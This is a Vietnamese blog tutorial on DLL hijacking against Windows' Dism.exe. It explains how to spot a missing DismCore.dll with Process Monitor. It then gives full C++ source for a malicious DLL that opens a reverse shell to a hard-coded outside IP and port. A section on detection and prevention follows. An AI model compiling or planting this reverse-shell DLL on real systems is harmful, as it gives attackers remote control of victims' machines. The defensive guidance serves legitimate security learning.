# Cách khai thác lỗ hổng DLL Hijacking trên Windows

## Tìm hiểu cách phát hiện và ngăn chặn lỗ hổng DLL Hijacking hiệu quả với Process Monitor, DLLSpy, Dependency Walker,...

**Tác giả:** Thanh Kim  
**Danh mục:** Basic Hacking  
**Nguồn:** https://anonyviet.com/cach-khai-thac-lo-hong-dll-hijacking-tren-windows/

---

**DLL Hijacking** – Cái tên nghe có phần bí ẩn, nhưng lại là một kỹ thuật tấn công đầy thú vị mà bất kỳ ai quan tâm đến bảo mật đều muốn khám phá. Trên hệ điều hành Windows, các chương trình phụ thuộc rất nhiều vào tệp DLL (Dynamic Link Library) để hoạt động trơn tru. Nhưng nếu một hacker tinh ranh thay thế DLL gốc bằng phiên bản "độc hại", chuyện gì sẽ xảy ra?

**Lưu ý quan trọng:** Bài viết này chỉ phục vụ mục đích học tập và nghiên cứu. AnonyViet không khuyến khích bất kỳ hành vi bất hợp pháp nào, và bạn cần chịu trách nhiệm cho hành động của mình!

## **DLL Hijacking là gì?**

DLL Hijacking là một kỹ thuật khai thác lỗ hổng khi chương trình không kiểm soát chặt chẽ cách tải tệp DLL. Khi một ứng dụng như Dism.exe (công cụ quản lý hệ thống của Windows) chạy, nó sẽ tìm kiếm DLL cần thiết trong một loạt thư mục theo thứ tự ưu tiên.

Nếu hacker đặt một DLL giả mạo vào thư mục mà chương trình kiểm tra trước khi đến thư mục chính thống (như System32), ứng dụng sẽ "ngây thơ" tải mã độc thay vì DLL gốc. Đây chính là "khe hở" mà các chuyên gia bảo mật – hoặc hacker – có thể tận dụng.

## **Tại sao Dism.exe là mục tiêu lý tưởng?**

Dism.exe là một công cụ tích hợp sẵn trong Windows, thường nằm ở thư mục C:\\Windows\\System32. Vì tính phổ biến và vai trò quan trọng của nó trong việc quản lý hệ thống, Dism.exe trở thành "con mồi" hấp dẫn để thử nghiệm DLL Hijacking. Hơn nữa, cách Windows tìm kiếm DLL đôi khi thiếu chặt chẽ, mở ra cơ hội cho các cuộc tấn công tinh vi.

## **Hướng dẫn khai thác DLL Hijacking với Process Monitor**

Để khai thác lỗ hổng này, chúng ta cần công cụ Process Monitor từ Sysinternals. Đây là "trợ thủ đắc lực" giúp bạn theo dõi cách hệ thống tương tác với các tệp DLL. Dưới đây là các bước chi tiết:

### **Bước 1: Chuẩn bị môi trường thử nghiệm**

- Vào trang chính thức của Sysinternals để tải Process Monitor. Chỉ cần giải nén và chạy file Procmon.exe.
- Để an toàn, hãy sử dụng VirtualBox hoặc VMware thay vì thử trực tiếp trên máy chính.
- Chọn mục tiêu: Ở đây, mình chọn Dism.exe, nhưng bạn có thể áp dụng cách này cho bất kỳ chương trình nào.

### **Bước 2: Theo dõi hành vi của Dism.exe**

Mở Process Monitor, bạn sẽ thấy hàng loạt sự kiện hệ thống được ghi lại. Đừng hoảng! Hãy thiết lập bộ lọc để tập trung:

- Nhấn **Ctrl + L** (hoặc vào Filter > Filter).
- Thêm điều kiện: **Process Name – is – dism.exe – Include** và **Path – contains – .dll – Include**
- Nhấn **Add** rồi **OK**. Giờ Process Monitor chỉ hiển thị hoạt động liên quan đến Dism.exe và DLL.

### **Bước 3: Chạy Dism.exe và quan sát**

- Mở PowerShell, gõ **C:\\Windows\\System32\\dism.exe** và nhấn Enter.
- Quay lại Process Monitor, bạn sẽ thấy danh sách các DLL mà Dism.exe cố gắng tải.
- Nếu cột Result hiển thị "**NAME NOT FOUND**" thì đó là dấu hiệu chương trình có thể bị khai thác DLL Hijacking.

Ví dụ, mình phát hiện tệp **C:\\Windows\\System32\\DismCore.dll** có thể bị khai thác.

### **Bước 4: Tạo DLL giả mạo**

- Sao chép Dism.exe vào thư mục %Temp%.
- Tạo một file DismCore.dll độc hại. Ở đây mình đã tạo ra một payload reverse shell có tên là DismCore.cpp rồi biên dịch thành file DismCore.dll bằng Visual Studio sau đó copy vào thư mục %Temp% và chạy lại file Dism.exe

```cpp
#define REVERSEIP "193.161.193.99" #địa chỉ ip máy hacker
#define REVERSEPORT 52543 #port máy hacker
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")
WSADATA wsaData;
SOCKET Winsock; 
SOCKET Sock; 
struct sockaddr_in hax;
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{ 
WSAStartup(MAKEWORD(2,2), &wsaData);
Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
hax.sin_family = AF_INET; 
hax.sin_port = htons(REVERSEPORT);
hax.sin_addr.s_addr = inet_addr(REVERSEIP);
WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);
memset(&ini_processo,0,sizeof(ini_processo));
ini_processo.cb=sizeof(ini_processo); 
ini_processo.dwFlags=STARTF_USESTDHANDLES; 
ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&ini_processo,&processo_info); 
return TRUE;
}
```

### **Bước 5: Kiểm tra kết quả**

Chạy Dism.exe từ %Temp%. Nếu thành công, một kết nối reverse shell sẽ được gửi đến IP và port bạn đã định nghĩa. Hacker giờ có thể điều khiển máy từ xa!

## **Cách phát hiện và phòng chống DLL Hijacking**

Hiểu cách khai thác là một chuyện, nhưng bảo vệ hệ thống khỏi DLL Hijacking lại là một thử thách khác. Dưới đây là cách nhận diện và ngăn chặn:

### **Cách phát hiện DLL Hijacking**

#### **1. Khám phá bằng Process Monitor**

Đây là công cụ hữu hiệu để theo dõi quá trình chương trình tải DLL: Quan sát hoạt động của ứng dụng và tìm kiếm dòng "NAME NOT FOUND" trong cột kết quả, khi nó cố lấy DLL từ những vị trí không bảo mật (chẳng hạn thư mục đang dùng hoặc ngoài System32).

Nếu ứng dụng tìm kiếm DLL ở các nơi dễ bị kẻ xấu chèn tệp giả trước khi đến thư mục chuẩn, đó là dấu hiệu tiềm ẩn nguy cơ.

#### **2. Tận dụng DLLSpy**

DLLSpy là giải pháp gọn nhẹ, chuyên biệt để phát hiện nguy cơ DLL Hijacking:

**Cách thực hiện:**

1. Khởi động DLLSpy trên máy tính.
2. Công cụ sẽ rà soát các tiến trình đang chạy, kiểm tra cách chúng tìm kiếm DLL.
3. DLLSpy đưa ra danh sách những ứng dụng có thể bị tấn công nếu chúng ưu tiên tìm DLL từ các thư mục không đáng tin (như thư mục cá nhân hoặc đường dẫn bất thường).

**Điểm mạnh:** DLLSpy tự động hóa việc phân tích, giúp nhanh chóng chỉ ra các phần mềm dễ tổn thương mà không cần thao tác thủ công như với Process Monitor.

Ví dụ: Khi kiểm tra Dism.exe, DLLSpy có thể phát hiện xem nó tìm DismCore.dll ở đâu ngoài System32 hay không.

#### **3. Kiểm tra trình tự tải DLL qua Dependency Walker**

Tải về Dependency Walker (miễn phí) để xem xét các DLL mà phần mềm cần dùng.

Khởi chạy ứng dụng trong công cụ này, sau đó quan sát danh sách DLL cùng đường dẫn nạp. Nếu phát hiện DLL được lấy từ nơi không chính thống, đó là tín hiệu cảnh báo.

#### **4. Lưu ý dấu hiệu bất thường**

- Khi một phần mềm quen thuộc (như Dism.exe) hoạt động kỳ lạ (hiển thị thông điệp lạ lùng hoặc gặp lỗi), có khả năng DLL đã bị thay thế.
- Sử dụng Task Manager hoặc Process Explorer để kiểm tra các tiến trình liên quan và xác minh nguồn gốc tập tin.

### **Những biện pháp ngăn ngừa lỗ hổng DLL Hijacking**

#### **1. Giới hạn quyền truy cập thư mục**

- Đảm bảo chỉ tài khoản quản trị viên mới được phép ghi dữ liệu vào các thư mục quan trọng như C:\\Windows\\System32.
- Tránh khởi chạy ứng dụng từ những nơi không an toàn (ví dụ: C:\\Downloads), vì kẻ tấn công có thể đặt DLL giả mạo tại đó.

#### **2. Áp dụng đường dẫn cố định trong lập trình**

Nếu bạn phát triển phần mềm, hãy cấu hình để chương trình gọi DLL bằng đường dẫn rõ ràng (như C:\\Windows\\System32\\DismCore.dll), thay vì để nó tự do tìm kiếm.

#### **3. Bật chế độ SafeDLLSearchMode**

Kiểm tra và đặt giá trị SafeDllSearchMode trong Registry (tại **HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager**) thành 1, để ưu tiên các thư mục hệ thống trước tiên.

#### **4. Triển khai công cụ bảo vệ**

Sử dụng phần mềm diệt virus hoặc chống mã độc (như Malwarebytes, Kaspersky,…) để nhận diện và ngăn chặn các DLL nguy hiểm kịp thời.

## **Kết luận**

**DLL Hijacking** không chỉ là một kỹ thuật tấn công mà còn là lời cảnh báo về tầm quan trọng của bảo mật phần mềm. Với các công cụ như Process Monitor, bạn có thể vừa khai thác vừa phòng chống lỗ hổng này một cách hiệu quả. Thế giới bảo mật còn vô vàn điều thú vị đang chờ bạn khám phá. Hãy bắt đầu từ hôm nay, biến kiến thức thành sức mạnh và luôn cẩn thận trong từng bước đi nhé!

**Tags:** dll, DLL Hijacking, Hijacking